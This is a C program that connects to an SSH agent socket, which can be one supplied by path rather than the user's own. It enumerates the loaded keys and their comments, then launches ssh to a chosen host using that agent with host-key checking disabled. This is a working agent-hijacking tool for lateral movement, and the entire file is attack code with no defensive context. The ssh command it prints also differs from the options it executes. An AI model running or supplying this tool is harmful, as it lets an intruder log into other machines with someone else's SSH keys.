#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SSH2_AGENTC_REQUEST_IDENTITIES  11
#define SSH2_AGENT_IDENTITIES_ANSWER    12
#define SSH_AGENT_FAILURE               5
#define SSH_AGENT_SUCCESS               6

static int agent_connect(const char *sock_path)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return -1; }

    struct sockaddr_un sa = {};
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, sock_path, sizeof(sa.sun_path) - 1);

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "[-] connect(%s): %s\n", sock_path, strerror(errno));
        close(fd); return -1;
    }
    return fd;
}

static int agent_send(int fd, uint8_t type, const uint8_t *payload, uint32_t payload_len)
{
    uint32_t total = 1 + payload_len;
    uint8_t hdr[5];
    hdr[0] = (total >> 24) & 0xff;
    hdr[1] = (total >> 16) & 0xff;
    hdr[2] = (total >>  8) & 0xff;
    hdr[3] = (total      ) & 0xff;
    hdr[4] = type;

    if (write(fd, hdr, 5) != 5) { perror("write hdr"); return -1; }
    if (payload_len && write(fd, payload, payload_len) != (ssize_t)payload_len) {
        perror("write payload"); return -1;
    }
    return 0;
}

static uint8_t *agent_recv(int fd, uint32_t *out_len, uint8_t *out_type)
{
    uint8_t hdr[5];
    if (read(fd, hdr, 5) != 5) { perror("read hdr"); return NULL; }

    uint32_t len = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
                   ((uint32_t)hdr[2] <<  8) | (uint32_t)hdr[3];
    *out_type = hdr[4];
    uint32_t payload_len = len - 1;
    *out_len = payload_len;

    uint8_t *buf = malloc(payload_len + 1);
    if (!buf) return NULL;
    buf[payload_len] = '\0';

    size_t got = 0;
    while (got < payload_len) {
        ssize_t n = read(fd, buf + got, payload_len - got);
        if (n <= 0) { free(buf); return NULL; }
        got += (size_t)n;
    }
    return buf;
}

static int list_identities(int fd)
{
    if (agent_send(fd, SSH2_AGENTC_REQUEST_IDENTITIES, NULL, 0) < 0) return -1;

    uint32_t resp_len; uint8_t resp_type;
    uint8_t *resp = agent_recv(fd, &resp_len, &resp_type);
    if (!resp) return -1;

    if (resp_type != SSH2_AGENT_IDENTITIES_ANSWER) {
        fprintf(stderr, "[-] agent replied type %u (expected %u)\n",
                resp_type, SSH2_AGENT_IDENTITIES_ANSWER);
        free(resp); return -1;
    }

    if (resp_len < 4) { free(resp); return 0; }
    uint32_t nkeys = ((uint32_t)resp[0] << 24) | ((uint32_t)resp[1] << 16) |
                     ((uint32_t)resp[2] <<  8) | resp[3];
    printf("[+] %u key(s) in agent:\n", nkeys);

    uint8_t *p = resp + 4, *end = resp + resp_len;
    for (uint32_t i = 0; i < nkeys && p + 4 < end; i++) {

        uint32_t blob_len = ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
                            ((uint32_t)p[2] <<  8) | p[3];
        p += 4;
        if (p + blob_len > end) break;

        if (blob_len >= 4) {
            uint32_t kt_len = ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|
                              ((uint32_t)p[2]<<8)|p[3];
            if (kt_len < blob_len - 4) {
                char ktype[64] = {};
                memcpy(ktype, p + 4, kt_len < sizeof(ktype)-1 ? kt_len : sizeof(ktype)-1);
                printf("  [%u] type: %s  blob_len=%u\n", i, ktype, blob_len);
            }
        }
        p += blob_len;

        if (p + 4 > end) break;
        uint32_t cmt_len = ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|
                           ((uint32_t)p[2]<<8)|p[3];
        p += 4;
        if (p + cmt_len > end) break;
        char comment[256] = {};
        memcpy(comment, p, cmt_len < sizeof(comment)-1 ? cmt_len : sizeof(comment)-1);
        printf("       comment: %s\n", comment);
        p += cmt_len;
    }

    free(resp);
    return 0;
}

static int ssh_via_agent(const char *sock_path, const char *host, const char *user)
{

    setenv("SSH_AUTH_SOCK", sock_path, 1);

    char userhost[256];
    if (user)
        snprintf(userhost, sizeof(userhost), "%s@%s", user, host);
    else
        strncpy(userhost, host, sizeof(userhost) - 1);

    printf("[*] ssh -o IdentitiesOnly=no -o BatchMode=yes %s\n", userhost);

    char *ssh_argv[] = {
        "/usr/bin/ssh",
        "-o", "IdentitiesOnly=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=10",
        userhost,
        NULL
    };
    execve("/usr/bin/ssh", ssh_argv, environ);
    perror("execve ssh");
    return -1;
}

int main(int argc, char *argv[])
{
    const char *sock_path = NULL;
    const char *host      = NULL;
    const char *user      = NULL;
    int mode_shell = 0;

    for (int i = 1; i < argc; i++) {
        if      (strcmp(argv[i], "--sock")  == 0 && i+1 < argc) sock_path = argv[++i];
        else if (strcmp(argv[i], "--shell") == 0 && i+1 < argc) {
            mode_shell = 1;

            const char *spec = argv[++i];
            char *at = strchr(spec, '@');
            if (at) {
                size_t ulen = (size_t)(at - spec);
                char *u = malloc(ulen + 1);
                memcpy(u, spec, ulen); u[ulen] = '\0';
                user = u; host = at + 1;
            } else {
                host = spec;
            }
        }
    }

    if (!sock_path) {

        sock_path = getenv("SSH_AUTH_SOCK");
    }

    if (!sock_path) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    printf("[*] agent: %s\n", sock_path);

    if (mode_shell) {
        if (!host) { fprintf(stderr, "[-] missing host\n"); return 1; }
        return ssh_via_agent(sock_path, host, user) < 0 ? 1 : 0;
    }

    int fd = agent_connect(sock_path);
    if (fd < 0) return 1;
    int r = list_identities(fd);
    close(fd);
    return r < 0 ? 1 : 0;
}
